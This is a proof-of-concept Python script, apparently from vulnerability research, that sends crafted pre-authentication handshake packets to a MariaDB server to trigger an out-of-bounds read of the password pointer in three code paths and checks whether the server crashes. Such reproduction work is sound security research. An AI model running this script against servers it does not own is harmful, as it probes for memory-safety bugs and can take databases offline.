#!/usr/bin/env python3
"""
One root cause, three branches: `passwd` can point past the packet.

    char *passwd= strend(user)+1;                      /* sql_acl.cc:14547 */

my_net_read() guarantees a terminating zero at read_pos[pkt_len], so when the
username fills the packet to its final byte with no NUL of its own, strend()
stops on *that* terminator and passwd becomes read_pos + pkt_len + 1 -- outside
the packet. Nothing checks it before the three branches consume it:

    strlen   !CLIENT_SECURE_CONNECTION          passwd_len= strlen(passwd);
    len1      CLIENT_SECURE_CONNECTION          passwd_len= (uchar)(*passwd++);
    lenenc    + ..._LENENC_CLIENT_DATA          safe_net_field_length_ll(&passwd,
                                                   read_pos + pkt_len - passwd)

and the comment above the `len1` branch asserts the opposite: "passwd remains
within the packet".

How far each one reads past the buffer depends on the branch, so this script
runs all three against a packet of exactly 16384 bytes (a multiple of IO_SIZE,
so net_realloc leaves max_packet == pkt_len and the slack past buff_end at its
minimum of NET_HEADER_SIZE + COMP_HEADER_SIZE + 1 = 8 bytes).

Whether the read leaves the heap block depends on the bytes following the
buffer, which are not attacker-supplied. Run the server under
ASAN_OPTIONS=malloc_fill_byte=254:max_malloc_fill_size=65536 to make the heap
adversarial -- no zero byte anywhere, and 0xFE selects the 9-byte branch of
safe_net_field_length_ll:

    strlen -> heap-buffer-overflow, READ 8 at the first byte after the region
    len1   -> no report (one byte, still inside the 8-byte slack)
    lenenc -> unknown-crash, READ 8 straddling the end by 2 bytes

On a stock heap none of them fires (400 reps, NOTES 4.25).

Usage: python3 -I poc_passwd_past_end.py <strlen|len1|lenenc> <pkt-len> <reps>
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mariadb_preauth import (Conn, server_alive, BASE_CAPS, CLIENT_PROTOCOL_41,
    CLIENT_SECURE_CONNECTION, CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA,
    CLIENT_CONNECT_WITH_DB, CLIENT_PLUGIN_AUTH, CLIENT_CONNECT_ATTRS, CLIENT_MYSQL)
HOST, PORT = "127.0.0.1", 3307
branch, total, reps = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])

def case(total_len):
    c = Conn(HOST, PORT, timeout=25.0)
    if c.read_greeting() is None:
        return "no greeting", True
    caps = (CLIENT_PROTOCOL_41 | BASE_CAPS) & ~(
        CLIENT_CONNECT_WITH_DB | CLIENT_PLUGIN_AUTH |
        CLIENT_CONNECT_ATTRS | CLIENT_MYSQL)
    if branch == "strlen":        # !CLIENT_SECURE_CONNECTION -> NOTES 4.3
        caps &= ~CLIENT_SECURE_CONNECTION
    elif branch == "len1":        # one-byte auth length
        caps |= CLIENT_SECURE_CONNECTION
    else:                         # length-encoded auth data
        caps |= CLIENT_SECURE_CONNECTION | CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA
    pkt = c.build_handshake_response(caps=caps, ext_caps=0, charset=45,
        user=b"u" * (total_len - 32), truncate=total_len)
    assert len(pkt) == total_len
    try:
        c.send_packet(pkt)
        c.read_packet()
    except OSError:
        c.close()
        return "closed", server_alive(HOST, PORT, 10.0)
    c.close()
    return "replied", True

for i in range(reps):
    out, alive = case(total)
    if not alive:
        print(f"  branch={branch} len={total} rep={i+1}: SERVER DIED")
        sys.exit(1)
print(f"  branch={branch} len={total}: {reps} reps, server survived")
